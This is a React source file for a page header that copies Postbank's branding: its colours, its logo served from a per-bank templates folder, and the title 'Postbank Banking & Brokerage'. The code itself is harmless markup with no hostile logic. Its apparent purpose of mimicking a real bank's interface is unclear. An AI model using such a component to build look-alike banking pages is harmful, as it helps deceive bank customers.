import React from 'react';

const Header: React.FC = () => {
  return (
    <header style={{ 
      backgroundColor: 'white',
      borderTop: '5px solid #fc0',
      borderBottom: '5px solid #0018a8',
      width: '100%',
      position: 'relative',
      boxShadow: '0 2px 8px rgba(206, 222, 231, 0.5)'
    }}>
      <div style={{ 
        padding: '30px 2rem 20px 2rem',
        display: 'flex',
        alignItems: 'center',
        gap: '1.5rem',
        maxWidth: '100%',
        margin: '0',
        minHeight: '60px'
      }}>
        {/* Postbank Logo */}
        <div style={{ display: 'flex', alignItems: 'center' }}>
          <img
            src="/templates/postbank/images/postbank-logo.svg"
            alt="Postbank"
            style={{ 
              height: '45px', 
              width: 'auto'
            }}
          />
        </div>

        {/* Separator */}
        <div style={{
          width: '1px',
          height: '35px',
          backgroundColor: '#e0e0e0'
        }} />

        {/* Postbank Banking & Brokerage Text */}
        <div style={{ 
          color: '#0018a8',
          fontSize: '22px',
          fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
          fontWeight: '700',
          letterSpacing: '0.01em'
        }}>
          Postbank Banking & Brokerage
        </div>
      </div>
    </header>
  );
};

export default Header;